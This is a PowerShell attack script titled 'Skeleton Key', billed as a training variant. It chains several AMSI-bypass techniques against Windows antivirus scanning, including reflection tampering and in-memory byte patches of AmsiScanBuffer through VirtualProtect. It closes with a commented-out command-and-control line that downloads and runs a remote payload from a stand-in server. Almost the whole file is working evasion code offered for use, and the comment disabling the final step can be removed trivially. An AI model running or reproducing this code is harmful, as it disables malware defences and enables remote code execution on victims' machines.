#
# --- "SKELETON KEY" v1.3 - FINAL TRAINING VARIANT (LIVE WEAPON, SAFETIED) ---
#

Write-Host "[INFO] Starting live-fire exercise with safetied weapon..."
# This variable will record which tool successfully breached the defense.
$WinningMethod = "None"

#
# PHASE 1: THE UNLOCKED DOOR (PowerShell v2 Check)
#
try {
    if (Test-Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine\{9E626246-324D-4A37-8835-5D596277B5BF}") {
        $WinningMethod = "PowerShell v2 Downgrade"
    }
} catch {}

#
# PHASE 2: INFILTRATION LOGIC (The Linear Cascade)
#

# ATTEMPT #1: THE RADIO SABOTAGE (Cornelis de Plaa)
if (-not $WinningMethod -or $WinningMethod -eq "None") {
    try {
        $Utils = [System.Type]::GetType('System.Management.Automation.Utils'); $CachedGP = $Utils.GetField('cachedGroupPolicyTest', 'NonPublic,Static')
        if ($null -ne $CachedGP) { $CachedGP.SetValue($null, $true) }
        try { [System.Management.Automation.AmsiUtils]::ScanContent('amsiutils', 'Script') | Out-Null; $WinningMethod = "DLL Hijack (Radio Sabotage)" } catch {}
    } catch {}
}

# ATTEMPT #2: THE "BLANK PAPER" GAMBIT (Surgical)
if (-not $WinningMethod -or $WinningMethod -eq "None") {
    try {
        $SurgicalPatch=@"
        using System; using System.Runtime.InteropServices;
        public class P {[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string m);[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Patch(){IntPtr h=GetModuleHandle("amsi.dll");IntPtr a=GetProcAddress(h,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)8,0x40,out o);byte[]p={0x48,0x31,0xD2};Marshal.Copy(p,0,a,p.Length);}}
"@
        Add-Type -TypeDefinition $SurgicalPatch; [P]::Patch()
        try { [System.Management.Automation.AmsiUtils]::ScanContent('amsiutils', 'Script') | Out-Null; $WinningMethod = "Blank Paper (Surgical Strike)" } catch {}
    } catch {}
}

# ATTEMPT #3: THE M16 (Classic Full Patch)
if (-not $WinningMethod -or $WinningMethod -eq "None") {
    try {
        $M16Patch=@"
        using System; using System.Runtime.InteropServices;
        public class P {[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string m);[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Patch(){IntPtr h=GetModuleHandle("amsi.dll");IntPtr a=GetProcAddress(h,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)5,0x40,out o);byte[]p={0x31,0xC0,0xC3};Marshal.Copy(p,0,a,p.Length);}}
"@
        Add-Type -TypeDefinition $M16Patch; [P]::Patch()
        try { [System.Management.Automation.AmsiUtils]::ScanContent('amsiutils', 'Script') | Out-Null; $WinningMethod = "M16 (Classic Patch)" } catch {}
    } catch {}
}

#
# PHASE 3: AFTER-ACTION REPORT (Objective Phase)
#
Write-Host "---------------------------------------------"
Write-Host "[INFO] Live-fire exercise complete."

if ($WinningMethod -ne "None") {
    Write-Host "[SUCCESS] Target Neutralized. A bypass method was effective." -ForegroundColor Green
    Write-Host "[INFO] Successful Tactic Used: $WinningMethod" -ForegroundColor Cyan
    Write-Host "[INFO] The following LIVE PAYLOAD would have been executed:" -ForegroundColor Yellow
    
    #
    # >>> THE LIVE ROUND (ON SAFE) <<<
    # This is the actual C2 callback. The '#' disables it for this training exercise.
    #
    # IEX (New-Object Net.WebClient).DownloadString('http://my-c2-server.com/final_payload.ps1')

} else {
    Write-Host "[FAILURE] All bypass methods were detected, blocked, or ineffective." -ForegroundColor Red
    Write-Host "[INFO] The weapon is NOT viable against this target's defense systems." -ForegroundColor Yellow
}
Write-Host "---------------------------------------------"
